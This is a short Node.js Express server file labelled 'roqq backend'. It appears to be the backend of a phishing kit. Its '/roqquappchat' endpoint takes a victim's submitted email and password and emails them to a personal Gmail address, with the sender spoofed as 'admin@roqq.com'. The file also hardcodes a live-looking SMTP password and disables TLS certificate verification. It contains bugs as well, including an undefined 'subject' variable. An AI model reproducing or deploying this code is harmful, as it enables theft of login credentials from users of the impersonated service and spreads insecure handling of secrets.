const express = require('express');
const app = express();
const path = require('path');
const nodemailer = require('nodemailer');

// Static folder
app.use('/public', express.static(path.join(__dirname, 'public')));

const transporter = nodemailer.createTransport({
    host: 'mail.growveonct.com',
    port: 465,
    secure: true,
    requireTLS: true,
    socketTimeout: 1200000,
    connectionTimeout: 1200000,
    auth: {
        user: 'admin@growveonct.com',
        pass: 'Panther1.?)0',
    },
    tls: {
        rejectUnauthorized: false,
    },
})

// verify connection configuration
transporter.verify(function(error, success) {
  if (error) {
    console.log(error);
  } else {
    console.log("Server is ready to take our messages");
  }
});


app.get('/', (req, res) =>{
  res.send('Welcome to roqq backend')
})

app.post('/roqquappchat', (req, res, next) => {
  const email = req.body.email
  const password = req.body.password
  const content = `email: ${email} \n password: ${password} `



  const mail = {
    from: 'admin@roqq.com',
    to: 'ifestephenie@gmail.com',
    message: subject,
    text: content
  }

  transporter.sendMail(mail, (err, data) => {
    if (err) {
      res.json({
        status: 'fail'
      })
    } else {
      res.json({
       status: 'success'
      })
    }
  })
})


const PORT = process.env.PORT || 3030
app.listen(PORT, () => console.info(`server has started on ${PORT}`))